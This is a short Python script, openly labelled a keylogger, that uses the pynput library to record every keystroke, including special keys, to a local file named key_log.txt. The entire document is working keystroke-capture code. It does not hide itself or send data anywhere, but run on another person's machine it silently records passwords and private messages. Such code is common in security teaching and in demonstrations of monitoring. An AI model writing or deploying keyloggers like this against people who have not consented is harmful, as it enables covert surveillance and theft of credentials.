from pynput import keyboard

# Path to save the log file
log_file = "key_log.txt"

# Function to write keys to the log file
def write_to_file(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"{key}\n")
    except Exception as e:
        print(f"Error writing to file: {e}")

# Callback function when a key is pressed
def on_press(key):
    try:
        # Handle alphanumeric keys
        if hasattr(key, 'char') and key.char is not None:
            write_to_file(key.char)
        else:
            # Handle special keys
            write_to_file(f"[{key}]")
    except Exception as e:
        print(f"Error: {e}")

# Main function to start the keylogger
def main():
    print("Keylogger started. Press Ctrl+C to stop.")
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == "__main__":
    main()
